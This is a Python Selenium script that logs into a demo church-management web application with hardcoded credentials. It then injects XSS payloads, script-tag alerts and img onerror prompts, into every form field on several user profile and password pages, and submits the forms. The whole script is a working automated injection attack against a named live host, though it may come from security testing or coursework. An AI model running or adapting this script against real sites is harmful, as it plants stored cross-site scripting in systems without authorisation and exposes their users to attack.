import requests
from bs4 import BeautifulSoup

from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.webdriver.support.ui import Select

url = 'https://chmsdemo.greenfossil.com/login'

conn = requests.get(url)


soup = BeautifulSoup(conn.content,features="lxml")
print(soup)
links = soup.find_all('script')
J = str(links[3])
from urlextract import URLExtract
inputs = soup.find_all('input')
inputfeild=[]
for tag in inputs:
    input = tag.get('id',None)
    if input is not None:
        inputfeild.append(input)
print(inputfeild)

button = soup.find('button')
classs=button.get('class',None)
print(classs)
edgeBrowser = webdriver.Edge(r"msedgedriver.exe")
# This is the step for maximizing browser window
edgeBrowser.maximize_window()
# Browser will get navigated to the given URL
edgeBrowser.get('https://chmsdemo.greenfossil.com/login')


sampleElement = WebDriverWait(edgeBrowser, 10).until(
    EC.presence_of_element_located((By.ID, inputfeild[0])))
         

sampleElement.send_keys("U0000028")

sampleElement2 = WebDriverWait(edgeBrowser, 10).until(
    EC.presence_of_element_located((By.ID, inputfeild[1])))

sampleElement2.send_keys("password")
varr=''
for i in classs:
    print(i)
    varr+=i
    varr+=' '
varr = varr[:-1]
print(varr)
sampleElement.send_keys(Keys.ENTER)
page_source = edgeBrowser.page_source
#,
#
xsslist=["<script>alert(1)</script>","<script>alert(1)</script>","<image/src/onerror=prompt(8)>","<img src =q onerror=prompt(8)>"]


inject=['https://chmsdemo.greenfossil.com/user/profile/28/details','https://chmsdemo.greenfossil.com/user/profile/28/relationship/search','https://chmsdemo.greenfossil.com/user/password/28/edit']
for payload in xsslist:
    for url in inject:
        print(url)
        edgeBrowser.get(url)
        wait = WebDriverWait(edgeBrowser, 10)
        wait.until(EC.url_to_be(url))
        page_source = edgeBrowser.page_source
        soup = BeautifulSoup(page_source, features="html.parser")
        for item in soup.select("[type^='hidden']"):
            item.decompose()
        inputs = soup.find_all('input')
        inputfield=[]
        for tag in inputs:
            input = tag.get('name',None)
            if input is not None:
                inputfield.append(input)
        soup2 = BeautifulSoup(page_source, features="html.parser")
        
        
        inputs2 = soup2.find_all(class_="selection")
        inputfield2=[]
        for tag in inputs2:
            input2 = tag.get('class',None)
            if input2 is not None:
                inputfield2.append(input2)

        #For pages with no selection fields

        if inputfield !=[] and inputfield2==[]:
            for i in inputfield:
                sampleElement = WebDriverWait(edgeBrowser, 10).until(
                EC.presence_of_element_located((By.NAME, i)))
                sampleElement.clear()
                sampleElement.send_keys(f"{payload}")
            sampleElement.send_keys(Keys.ENTER)
            sleep(1)

        #For pages with selection fields
        if inputfield !=[] and inputfield2!=[]:
            
            #To find selection fields to click to make the choices visable and interable 
            sampleElement2 = WebDriverWait(edgeBrowser, 10).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "selection")))
            Selection=edgeBrowser.find_elements(By.CLASS_NAME, "selection")
            
            #To click to make the choices visable 
            for field in Selection:
                if field.is_displayed():
                    #click to open selection field
                    field.click()
                    #find the first option
                    clcik=field.find_element(By.CLASS_NAME,"item")
                    print(clcik)
                    #Select the first option
                    sleep(1)
                    clcik.click()

            #Fill in all writeable inputfield with xss payload
            for i in inputfield:
                sampleElement = WebDriverWait(edgeBrowser, 10).until(
                EC.presence_of_element_located((By.NAME, i)))
                sampleElement.send_keys(f"{payload}")
            #Submit the form to test payload
            sampleElement.send_keys(Keys.ENTER)



            sleep(1)